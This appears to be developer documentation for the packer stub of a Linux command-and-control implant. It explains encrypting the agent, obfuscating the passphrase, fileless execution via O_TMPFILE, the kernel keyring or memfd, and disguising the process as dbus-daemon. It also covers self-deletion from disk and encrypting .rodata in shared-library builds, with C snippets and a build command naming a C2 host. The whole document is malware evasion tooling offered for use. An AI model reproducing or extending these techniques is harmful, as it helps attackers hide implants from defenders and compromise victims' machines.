# Stub Packer

The stub packer wraps the compiled agent binary in a minimal encrypted loader. The final binary contains only the stub code (~3KB) plus the encrypted agent blob. Running `strings` or static analysis on the packed binary reveals nothing from the agent — no Ax\*/Beacon\* API names, no URIs, no headers, no keys.

---

## How It Works

```
┌─────────────────────────────────────────────────────────┐
│                    Packed Binary                         │
│                                                         │
│  stub.c code (~3KB)                                     │
│  ┌───────────────────────────────────────────────────┐  │
│  │ stub_payload.h (embedded at compile time)          │  │
│  │   - salt (16 bytes random)                         │  │
│  │   - passphrase fragments (4×8 bytes, shuffled+XOR) │  │
│  │   - encrypted agent blob (XOR with derived key)    │  │
│  └───────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘

At runtime:
  1. Reconstruct passphrase from shuffled fragments
  2. Derive XOR key via KDF (FNV-1a 64-bit + xorshift64)
  3. Decrypt agent into heap buffer
  4. Try execution techniques in order (see below)
  5. Zero decrypted buffer + free
  6. prctl(PR_SET_NAME, "dbus-daemon")
  7. execve/execveat with fake argv → agent runs from memory
```

After execution, the stub process image is replaced by the agent. The decrypted agent never exists on disk or in a named file.

---

## Execution Techniques

The stub tries three execution techniques in order of preference, from most to least evasive:

| Priority | Technique | Description | Evasion |
|----------|-----------|-------------|---------|
| 1 | **O_TMPFILE + execveat** | Open anonymous inode with `O_TMPFILE`, write agent, execute with `execveat(AT_EMPTY_PATH)` | No memfd, no named file, evades fanotify hooks |
| 2 | **Kernel keyring (big_key)** | Store agent in kernel keyring via `add_key("big_key")`, retrieve with `keyctl(KEYCTL_READ)`, execute from userland buffer | No fd, no inode, no VFS entry at all |
| 3 | **memfd_create** | Classic anonymous file descriptor via `memfd_create("")` | Fully anonymous, no filesystem entry |

If technique 1 fails (kernel too old, filesystem doesn't support `O_TMPFILE`), the stub falls back to technique 2. If keyring is unavailable (not compiled into the kernel), it falls back to technique 3. This ensures maximum compatibility while using the most evasive method available.

> **Note:** `O_TMPFILE + execveat` is more evasive than `memfd_create` because it doesn't create a `/proc/self/fd/N` entry that points to an anonymous memfd. Keyring storage is the most evasive but least compatible.

---

## Build Flow

```bash
# 1. Compile the agent (automatic — Makefile handles everything)
make NAX_TCP_MODE=https NAX_C2_HOST=192.168.1.1 NAX_C2_PORT=443 ...

# The Makefile automatically:
#   a) Compiles the agent ELF
#   b) Runs gen_stub_payload.py -> encrypts agent -> generates stub_payload.h
#   c) Compiles stub.c with embedded payload -> overwrites the target binary
#   d) Strips the final binary
```

No manual steps required. The stub wrapping is automatic for all ELF builds (`NAX_FORMAT=elf`). It is disabled for shared library builds (`NAX_FORMAT=so`).

> **Note:** `gen_stub_payload.sh` was replaced by `gen_stub_payload.py` in commit `3aa9eb4`. The Python script is a single self-contained file with no external dependencies and no inline shell/Python mixing.

---

## Encryption Scheme

### Key Derivation

The encryption does not use a static XOR key. Instead, it derives the key at runtime from a passphrase and salt:

```
Passphrase (32 bytes random, generated at build time)
    +
Salt (16 bytes random, generated at build time)
    ↓
FNV-1a 64-bit hash (passphrase bytes, then salt bytes)
    ↓
xorshift64 PRNG expansion → 32 bytes of key material
    ↓
XOR key (32 bytes)
```

The KDF is implemented identically in Python (`gen_stub_payload.py`) and C (`stub.c`), producing the same key from the same inputs.

### Passphrase Protection

The passphrase is not stored directly in the binary. It is:

1. **XOR-obfuscated** — each byte XORed with `(0x37 + i * 13) & 0xFF`
2. **Fragmented** — split into 4 chunks of 8 bytes
3. **Shuffled** — fragments stored in order `[2, 0, 3, 1]`, not `[0, 1, 2, 3]`

At runtime, `reconstruct_pass()` reassembles the original order and reverses the XOR:

```c
memcpy(pass +  0, stub_pass_frag1, 8);   /* original[0] */
memcpy(pass +  8, stub_pass_frag3, 8);   /* original[1] */
memcpy(pass + 16, stub_pass_frag0, 8);   /* original[2] */
memcpy(pass + 24, stub_pass_frag2, 8);   /* original[3] */

for (int i = 0; i < 32; i++)
    pass[i] ^= (0x37 + i * 13) & 0xFF;
```

This means a static analysis tool cannot find the passphrase by searching for a contiguous 32-byte constant — it is scattered, reordered, and obfuscated.

---

## Process Camouflage

After decryption and before execution, the stub disguises itself:

### Process name

```c
prctl(PR_SET_NAME, "dbus-daemon");
```

### Fake argv

```c
char *fake_argv[] = {
    "/usr/bin/dbus-daemon",
    "--system",
    "--address=systemd:",
    "--nofork",
    "--nopidfile",
    "--systemd-activation",
    "--syslog-only",
    NULL
};
execve(fd_path, fake_argv, environ);
```

In `ps` output, the agent appears as:

```
/usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
```

All strings (`dbus-daemon`, `--system`, etc.) are built char-by-char with volatile writes — they do not appear in `strings` output of the binary.

### Session detach

```c
setsid();
```

The agent detaches from the controlling terminal, preventing it from receiving signals when the terminal closes.

---

## Self-Delete Integration

Before execution, the stub saves its own path:

```c
setenv("NAX_STUB_PATH", realpath(argv[0]), 1);
```

When the agent exits (or OPSEC detects a hostile environment), `nax_opsec_cleanup()` reads this variable and deletes the stub binary from disk:

```c
// In opsec.c
const char *stub_path = getenv("NAX_STUB_PATH");
if (stub_path && *stub_path)
    unlink(stub_path);
```

After the agent finishes, `unsetenv("NAX_STUB_PATH")` removes the variable from memory.

---

## Memory Hygiene

The stub zeros all sensitive data before execution:

| Data | Zeroed when |
|---|---|
| Reconstructed passphrase | Immediately after KDF |
| Derived XOR key | Immediately after decryption |
| Decrypted agent buffer | After `write()` to fd, before `free()` |

After execution, the stub's address space is replaced by the agent. No residual decryption key or plaintext agent bytes remain in memory.

---

## When the Stub Is Disabled

| Build mode | Stub |
|---|---|
| `NAX_FORMAT=elf` | ✅ Automatic (default) |
| `NAX_FORMAT=so` | ❌ Disabled — `.so` is loaded by `dlopen`, not executed |
| `NAX_DEBUG=1` | ✅ Still applied (debug + packed) |

---

## .so Builds: .rodata XOR Encryption

For shared library (`.so`) builds where the stub cannot be used, the agent uses a different protection: the entire `.rodata` section is XOR-encrypted at build time by `rodata_crypt.py`.

### How it works

1. `rodata_crypt.py` runs as a post-build step on the `.so` binary
2. It generates a random 32-byte XOR key and encrypts every byte in `.rodata` in-place
3. The key, section offset, and length are embedded in the `.so` itself as exported symbols (`__rodata_xor_key`, `__rodata_xor_addr`, `__rodata_xor_len`)
4. A `constructor(101)` in `shared.c` runs at `dlopen()` time, before `main()` or the agent thread starts
5. The constructor uses `dl_iterate_phdr` to find its own load base, then decrypts `.rodata` in-place via `mprotect` + XOR
6. The key is zeroed from memory after decryption

```c
__attribute__((constructor(101)))
static void _rodata_decrypt(void) {
    // find own base via dl_iterate_phdr
    // mprotect .rodata RW
    // XOR each byte with key
    // mprotect .rodata R (restore)
    // zero the key
}
```

This means `strings` on the `.so` reveals nothing — all string constants (Ax\* names, URIs, error messages, command names) are encrypted at rest and only exist in plaintext during execution.

Additionally, `unsetenv("LD_PRELOAD")` is called in the constructor to prevent the `.so` from propagating to child processes spawned by the agent.

---

## What `strings` Shows

**Unpacked/unprotected agent:**
```
BeaconPrintf
BeaconDataParse
AxOpenFile
AxMalloc
/news/feed
X-Beacon-Id
Mozilla/5.0...
dbus-daemon
```

**Packed ELF stub:**
```
free
execve
malloc
write
close
syscall
libc.so.6
GLIBC_2.4
```

**Encrypted .so:**
```
(binary garbage — all .rodata is XOR-encrypted)
```

---

## Files

| File | Description |
|------|-------------|
| `nax_linux/src/stub/stub.c` | Stub loader source (O_TMPFILE, keyring, memfd techniques) |
| `nax_linux/src/stub/gen_stub_payload.py` | Encryption + header generation script (replaces gen_stub_payload.sh) |
| `nax_linux/src/stub/rodata_crypt.py` | Post-build .rodata XOR encryption for .so builds |
| `nax_linux/src/stub/stub_payload.h` | Auto-generated encrypted payload (gitignored) |
| `nax_linux/src/shared.c` | .so constructor: rodata decrypt + agent thread spawn |
